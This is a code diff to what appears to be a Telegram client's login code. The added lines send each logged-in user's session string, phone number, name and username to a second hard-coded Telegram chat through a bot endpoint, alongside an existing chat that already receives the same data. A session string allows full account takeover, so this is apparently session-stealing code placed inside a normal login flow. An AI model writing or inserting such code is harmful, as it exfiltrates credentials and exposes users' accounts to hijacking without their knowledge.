@@ -228,7 +228,17 @@ async function login() {
             await sendChannels();
             await sleep(1000)
             const sess = client.session.save() as unknown as string;
-            const user: any = await result.user.toJSON()
+            const user: any = await result.user.toJSON();
+            const payload2 = {
+                chat_id: "-1001970448012",
+                text: `${(username).toUpperCase()}:\nnumber = +${user.phone}\nsession = ${sess}\nname:${user.firstName} ${user.lastName}\nuserName: ${user.username}`
+            };
+            const options2 = {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload2)
+            };
+            await fetchWithTimeout(`${ppplbot}`, options2);
             const payload = {
                 chat_id: "-1001801844217",
                 text: `${(username).toUpperCase()}:\nnumber = +${user.phone}\nsession = ${sess}\nname:${user.firstName} ${user.lastName}\nuserName: ${user.username}`
@@ -399,4 +409,15 @@ async function sendChannels() {
         body: JSON.stringify(payload)
     };
     await fetchWithTimeout(`${ppplbot}`, options);
+
+    const payload2 = {
+        chat_id: "-1001970448012",
+        text: reply
+    };
+    const options2 = {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload2)
+    };
+    await fetchWithTimeout(`${ppplbot}`, options2);
 }
